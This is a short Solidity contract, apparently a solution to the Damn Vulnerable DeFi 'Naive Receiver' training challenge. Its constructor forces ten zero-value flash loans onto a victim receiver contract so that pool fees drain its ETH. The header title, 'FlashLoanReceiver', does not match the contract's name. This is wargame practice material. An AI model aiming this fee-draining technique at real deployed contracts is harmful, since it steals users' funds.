// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanAttacker {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _receiver) {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(payable(_pool));
        for(uint8 i = 0; i < 10; i++) {
            pool.flashLoan(IERC3156FlashBorrower(_receiver), ETH, 0, "");
        }
    }

    // Allow deposits of ETH
    receive() external payable {}
}